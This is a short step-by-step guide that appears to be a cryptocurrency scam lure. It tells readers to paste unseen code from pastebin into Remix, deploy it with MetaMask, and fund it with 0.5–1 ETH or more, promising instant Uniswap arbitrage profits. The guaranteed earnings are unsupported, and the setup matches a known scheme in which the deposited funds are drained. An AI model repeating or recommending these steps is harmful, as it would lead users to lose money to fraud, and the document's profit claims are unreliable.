How to launch your own arbitrage bot:

1.      Download MetaMask (if you don’t have it already):

metamask.io
metamask.io
2.      Access Remix:

Remix - Ethereum IDE
remix.ethereum.org
3.      Click on the “contracts” folder and then create “New File”. Rename it as you like, i.e: “bot.sol”

Note: If there is a problem if the text is not colored when you create bot.sol and paste the codes from pastebin, try again. If the codes are not colored, you cannot proceed to the next step.

4.      Paste this code in Remix.

5.      Go to the “Solidity Compiler” tab, select version “0.6.6+commit.6c089d02” and then select “Compile bot.sol”.

Make sure “bot.sol” is selected in the CONTRACT section of the SOLIDITY COMPILER section.

6.      Go to the “DEPLOY & RUN TRANSACTIONS” tab, select the “Injected Provider - Metamask” environment and then “Deploy”. By approving the Metamask contract creation fee, you will have created your own contract.

7.      Copy your newly created contract address as shown on video and fund it with any amount of ETH (minimum 0.5-1 ETH recommended) that you would like the bot to earn with by simply sending ETH to your newly created contract address.

8.      After your transaction is confirmed, click the “start” button to run the bot. Withdraw your ETH at any time by clicking the “Withdraw” button.

That’s it. The bot will start working immediately earning you profits from arbitrage trades on Uniswap pools.
